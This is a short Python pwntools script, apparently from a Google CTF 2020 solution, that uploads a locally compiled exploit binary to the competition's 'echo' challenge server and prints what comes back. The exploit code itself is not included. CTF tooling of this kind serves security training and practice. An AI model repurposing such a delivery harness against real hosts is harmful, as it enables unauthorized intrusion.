from pwn import *
from time import sleep

fd = open('./exploit', 'rb')
exploit = fd.read()


r = remote('echo.2020.ctfcompetition.com', 1337)
r.send(p32(len(exploit)))
r.send(exploit)

sleep(20);
r.shutdown()

try:
    while True:
        resp = r.recv(0x400, timeout=5)
        for line in resp.split(b"\n"):
            print(line)
except:
    pass
